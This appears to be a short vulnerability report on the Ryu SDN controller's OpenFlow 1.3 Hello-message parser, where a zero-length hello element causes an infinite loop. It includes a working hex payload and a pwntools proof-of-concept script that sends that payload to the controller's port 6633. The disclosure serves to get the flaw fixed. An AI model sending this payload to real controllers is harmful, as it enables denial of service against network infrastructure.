| in /ryu/ofproto/ofproto\_v1\_3\_parser.py about line=139  ``` class OFPHello(MsgBase): ...     @classmethod     def parser(cls, datapath, version, msg_type, msg_len, xid, buf):         msg = super(OFPHello, cls).parser(datapath, version, msg_type,                                           msg_len, xid, buf)          offset = ofproto.OFP_HELLO_HEADER_SIZE         elems = []         while offset < msg.msg_len:             type_, length = struct.unpack_from(                 ofproto.OFP_HELLO_ELEM_HEADER_PACK_STR, msg.buf, offset)             ...             offset += length         msg.elements = elems         return msg ```  If the variable length is equal to 0,the offset will no longer change and the parsing will fall into an infinite loop.  payload:  ``` payload="04000010000000130001000000000010" payload=bytes.fromhex(payload) ```  poc:  ``` from pwn import * p=remote("0.0.0.0",6633) payload="04000010000000130001000000000010" payload=bytes.fromhex(payload)p.send(payload) p.interactive()  ```  The Hello message is the first step in the handshake process, which means that all malicious traffic can put the controller into an infinite loop before establishing a connection with the controller. |
